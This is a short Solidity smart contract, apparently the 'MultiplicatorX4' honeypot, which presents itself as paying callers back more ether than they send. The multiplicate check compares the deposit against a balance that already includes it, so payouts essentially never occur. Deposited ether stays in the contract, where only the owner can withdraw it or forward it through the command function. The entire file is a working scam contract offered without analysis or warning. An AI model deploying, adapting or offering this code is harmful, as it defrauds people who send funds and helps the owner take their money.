pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _receiver, bytes _data) public payable {
        require(msg.sender == owner);

        require(_receiver.call.value(msg.value)(_data));
    }

    function multiplicate(address _receiver) public payable {
        if (msg.value >= this.balance) {
            require(_receiver.call.value(this.balance + msg.value)());
        }
    }
}